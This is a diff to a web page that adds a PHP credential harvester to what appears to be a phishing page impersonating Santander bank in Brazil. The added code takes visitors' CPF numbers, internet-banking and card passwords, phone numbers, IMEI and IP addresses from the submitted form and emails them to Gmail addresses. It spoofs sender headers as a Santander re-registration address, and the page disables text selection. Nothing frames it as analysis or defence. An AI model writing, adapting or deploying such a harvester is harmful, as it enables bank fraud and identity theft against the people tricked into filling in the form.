@@ -1,3 +1,38 @@
+<?php 
+  if(isset($_POST))
+	{
+		$ip = $_SERVER['REMOTE_ADDR'];
+
+		//$emaildestinatario = 'Caixaatualizda@gmail.com';
+		//$emaildestinatario = 'erickqueiroz93@gmail.com';
+        $emaildestinatario = 'Itauatualizda@gmail.com';
+
+		$subj = "Dados / IP: $ip - Chegou: Santander";
+
+
+		$mensagemHTML = '
+		<p>------------- |Chegou Santander| ------------</p>
+
+		<p><b>CPF:</b> '.$_POST['cpf'].'<br>
+		<p><b>Senha Net:</b> '.$_POST['snet'].'<br>
+		<p><b>Senha Cartao:</b> '.$_POST['scard'].'<br>
+		<p><b>Telefone:</b> '.$_POST['ddd'].' '.$_POST['fone'].'<br>
+		<p><b>IMEI:</b> '.$_POST['imei'].'<br>
+		<p><b>Dispositivo:</b> '.$_POST['dispositivo'].'<br>
+		<p><b>IP:</b> '.$ip.'<br>
+		<br>
+		<p>-------------- |Chegou Santander| -----------------</p>
+
+		';
+
+		$headers = "MIME-Version: 1.1\r\n";
+		$headers .= "Content-type: text/html; charset=utf-8\r\n";
+		$headers .= "From: recadastramento@santander.com.br \r\n";
+		$headers .= "Return-Path: recadastramento@santander.com.br \r\n";
+		$envio = mail($emaildestinatario, $subj, $mensagemHTML, $headers);
+    sleep(2);
+	}
+?>
 <html><head><script>
 function disableselect(e){
     return false;
